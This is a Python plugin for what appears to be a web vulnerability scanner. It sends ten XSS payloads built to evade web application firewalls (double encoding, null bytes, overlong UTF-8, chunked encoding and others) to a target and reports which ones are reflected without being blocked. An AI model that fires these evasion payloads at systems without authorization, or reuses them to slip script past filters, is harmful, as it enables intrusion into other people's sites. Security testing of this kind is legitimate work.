# plugins/waf_bypass.py
import requests


BYPASS_TECHNIQUES = {
    "CASE_MIX": {"payload": "<ScRiPt>alert(1)</sCrIpT>", "indicator": "<ScRiPt>"},
    "DOUBLE_ENCODE": {"payload": "%253Cscript%253Ealert(1)%253C/script%253E", "indicator": "<script>"},
    "UNICODE_ESCAPE": {"payload": "\u003cscript\u003ealert(1)\u003c/script\u003e", "indicator": "alert"},
    "NULL_BYTE": {"payload": "%00<script>alert(1)</script>", "indicator": "<script>"},
    "COMMENT_INJECT": {"payload": "<scr<!---->ipt>alert(1)</scr<!---->ipt>", "indicator": "alert"},
    "CONTENT_TYPE_BYPASS": {"payload": '{"test": "<script>alert(1)</script>"}', "indicator": "alert",
                            "content_type": "application/json"},
    "CHUNKED_ENCODING": {"payload": "<script>alert(1)</script>", "indicator": "alert",
                          "headers": {"Transfer-Encoding": "chunked"}},
    "HPP": {"payload": "?q=<script>&q=alert(1)&q=</script>", "indicator": "alert"},
    "OVERLONG_UTF8": {"payload": "%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE", "indicator": "alert"},
    "NEWLINE_INJECTION": {"payload": "<scri%0apt>alert(1)</scri%0apt>", "indicator": "alert"},
}


def _test_bypass(target, name, config):
    """Testa uma técnica de WAF bypass."""
    payload = config["payload"]
    indicator = config["indicator"]
    extra_headers = config.get("headers", {})
    ct = config.get("content_type", None)

    url = f"http://{target}/?test={payload}" if "HPP" not in name else f"http://{target}/{payload}"
    headers = {"User-Agent": "Mozilla/5.0 (Cascavel WAF Bypass Tester)"}
    headers.update(extra_headers)
    if ct:
        headers["Content-Type"] = ct

    try:
        if ct:
            resp = requests.post(url, data=payload, headers=headers, timeout=8)
        else:
            resp = requests.get(url, headers=headers, timeout=8)

        if resp.status_code != 403 and indicator.lower() in resp.text.lower():
            return {
                "tipo": f"WAF_BYPASS_{name}", "tecnica": name,
                "severidade": "CRITICO",
                "descricao": f"WAF bypass via {name} — payload refletido sem bloqueio!",
                "status": resp.status_code,
            }

        if resp.status_code == 403:
            return {
                "tipo": f"WAF_BLOCKED_{name}", "tecnica": name,
                "severidade": "INFO",
                "descricao": f"WAF bloqueou técnica {name} (HTTP 403)",
            }
    except Exception:
        pass
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner de WAF Bypass techniques.
    2026 Intel: Cloudflare/Akamai/ModSecurity bypass, double encoding,
    Unicode escape, null byte, HPP, chunked encoding, content-type switch.
    """
    _ = (ip, open_ports, banners)  # Standardized plugin signature
    vulns = []

    for name, config in BYPASS_TECHNIQUES.items():
        result = _test_bypass(target, name, config)
        if result:
            vulns.append(result)

    return {"plugin": "waf_bypass", "resultados": vulns if vulns else "WAF resistente a todas as técnicas testadas"}
